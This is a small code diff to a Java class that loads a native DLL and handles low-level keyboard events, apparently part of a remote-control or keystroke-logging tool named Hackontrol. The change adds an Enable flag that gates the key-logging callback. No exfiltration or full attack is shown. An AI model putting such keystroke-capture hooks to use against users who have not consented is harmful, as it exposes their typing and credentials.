@@ -12,6 +12,7 @@ public class NativeLibrary {
 	public static final Map<Integer, Boolean> KEYSTROKE_MAP = new HashMap<>();
 
 	public static boolean Block = false;
+	public static boolean Enable = false;
 
 	static {
 		System.load("D:\\GitHub Repository\\Hackontrol\\Hackontrol\\x64\\Release\\Native Library.dll");
@@ -27,6 +28,10 @@ public class NativeLibrary {
 	}
 
 	private static boolean log(int keyAction, int keyCode, int scanCode, int flags, int time) {
+		if(!NativeLibrary.Enable) {
+			return NativeLibrary.Block;
+		}
+
 		KeyEntry entry = new KeyEntry();
 
 		switch(keyAction) {
